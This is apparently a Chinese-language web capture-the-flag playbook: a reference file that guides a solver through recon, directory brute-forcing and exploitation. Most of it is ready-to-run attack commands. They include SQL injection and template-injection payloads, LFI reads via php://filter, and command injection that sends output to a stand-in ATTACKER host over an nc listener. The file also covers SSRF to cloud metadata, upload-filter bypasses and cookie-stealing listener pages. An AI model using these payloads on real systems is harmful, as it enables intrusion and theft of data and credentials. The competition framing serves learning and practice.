# refs/web.md — Web 工具箱

> 目标是一个 HTTP 服务 / 源码 / 前端 JS。流程：指纹 → 铺面 → 找入口 → 打穿 → 取 flag。
> 所有命令容器内可直接跑；标「(未预装)」的先别用。

## 1. 判定特征

- 给了 URL / 域名 / 端口，`curl -i` 有 HTTP 响应头
- 附件是源码包、`.php/.js/.py/.java` 文件、`Dockerfile`、`docker-compose.yml`
- 题面出现上传 / 注入 / 绕过 / 鉴权 / 参数 / 反序列化 / 模板 / SSRF / 越权
- 端口 80/443/8080/5000/8000 开着，或 banner 里有 nginx / Apache / Werkzeug / Flask

## 2. 环境自检

```sh
for t in curl wget jq git rg nmap nc socat tshark python3 node playwright-cli; do
  printf '%-14s' "$t"; command -v "$t" || echo MISSING
done
python3 -c "import requests, pwn; print('py-ok')" 2>/dev/null || echo "requests MISSING"
command -v sqlmap ffuf dirsearch gobuster whatweb 2>/dev/null || echo 'sqlmap/ffuf/dirsearch/gobuster/whatweb 均未预装'
```

## 3. 铺面（先把手脚放开）

```sh
curl -i -s http://TARGET/ | head -40                  # 头 + 首页
curl -s http://TARGET/robots.txt http://TARGET/sitemap.xml
nmap -sV -p- -T4 TARGET -oN /tmp/nmap.txt             # 全端口 + 服务版本
curl -s -o /dev/null -w '%{http_code} %{size_download} %{url_effective}\n' http://TARGET/admin
git -C /tmp clone --depth 1 http://TARGET/.git 2>/dev/null || true   # 源码泄露
curl -s http://TARGET/.git/HEAD; curl -s http://TARGET/www.zip -o /tmp/w.zip
curl -s http://TARGET/package.json http://TARGET/composer.json http://TARGET/Dockerfile
```

无 ffuf/dirsearch 时的并发目录枚举（用 python3 现写，别等工具）：

```sh
python3 - <<'PY'
import concurrent.futures, requests
words=[w.strip() for w in open('/tmp/wl.txt')]
def hit(w):
    try:
        r=requests.get(f'http://TARGET/{w}',timeout=5,allow_redirects=False)
        if r.status_code not in (404,): print(r.status_code,len(r.content),w)
    except Exception: pass
with concurrent.futures.ThreadPoolExecutor(20) as ex: list(ex.map(hit,words))
PY
```

字典现生成：`python3 -c "print('\n'.join(open('/usr/share/wordlists/common.txt').read().split()))"`，
没有就手写常见名（admin、login、api、upload、flag、source、backup、.git、.env、www.zip）。

## 4. 常见漏洞类的直接打法

```sh
# SQL 注入（sqlmap 未预装：pip install sqlmap，或先手工）
curl -s "http://TARGET/?id=1' and '1'='1" ; curl -s "http://TARGET/?id=1' and '1'='2"
curl -s "http://TARGET/?id=1 union select 1,group_concat(table_name),3 from information_schema.tables-- -"

# 模板注入：先数学探针，再读文件
curl -s "http://TARGET/?name={{7*7}}"          # 49 → Jinja2/Twig
curl -s "http://TARGET/?name={{config}}"       # Flask 配置常含 SECRET_KEY
curl -s "http://TARGET/?name={{''.__class__.__mro__[1].__subclasses__()}}"

# 文件包含 / LFI：先读源码再谈利用
curl -s "http://TARGET/?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl -s "http://TARGET/?file=/flag" ; curl -s "http://TARGET/?file=../../../../flag"

# 命令注入（无回显时外带，容器内有 nc）
curl -s "http://TARGET/?cmd=id" ; curl -s "http://TARGET/?cmd=cat%20/flag"
nc -lvnp 4444                                   # 另一个窗口：收外带
curl -s "http://TARGET/?cmd=curl+http://ATTACKER:4444/$(id|base64+-w0)"

# 反序列化 / JWT
python3 -c "import base64,json;t='EY...'.split('.')[0];print(base64.urlsafe_b64decode(t+'=='))"
python3 -c "import jwt" 2>/dev/null || echo 'PyJWT 未预装：pip install pyjwt'
```

- **文件上传**：先传无害 `.txt` 验证路径与回显，再试 `.php/.jsp/.phtml/.phar`、双扩展名、
  `Content-Type` 伪造、`.htaccess`、文件名截断；传上去先访问确认可解析。
- **SSRF**：`file:///flag`、`http://127.0.0.1:PORT/`、`gopher://`、云元数据 `169.254.169.254`。
- **越权/IDOR**：改 `id`、`user_id`、`role`，带/不带 Cookie 各试一次，对比响应体长度。
- **源码审计**：`rg -n "exec|system|eval|unserialize|include|render_template_string" -g '!node_modules'`。
- **前端类**：`rg -n "api|token|key|secret" web/`；`node` 已装，可直接跑 JS 复现签名逻辑。

## 5. 浏览器类题（XSS / 需要真实渲染）

容器内已装 Playwright + chromium：

```sh
playwright-cli open http://TARGET/ --screenshot /tmp/shot.png
playwright-cli eval "document.cookie" 
```

需要 bot 交互（管理员访问）时，用 curl 起自己的监听页收 cookie，别只靠肉眼。

## 6. 卡点与换维

| 卡点 | 换维方向 |
|---|---|
| 目录扫不出东西 | 换字典/加扩展名；查 `.git`、备份文件、`/api`、`/debug`；看首页 JS 里的接口路径 |
| 有回显但没洞 | 换参数（GET→POST→JSON→Cookie→Header）；加 `?debug=1`、改 `X-Forwarded-For` |
| 上传被拦 | 换后缀/Content-Type/魔术字节；看是否只校验前端 JS；试 zip/phar 自解压 |
| 命令执行无回显 | 外带（curl/nc）、写文件到 Web 目录、DNS 出网、盲注时间侧信道 |
| 只给源码不给服务 | 直接审计找 sink，本地 `python3 app.py` 起服务复现 |
| 卡在加密参数 | 看前端 JS 的加密函数，用 node 直接复刻；别硬猜算法 |
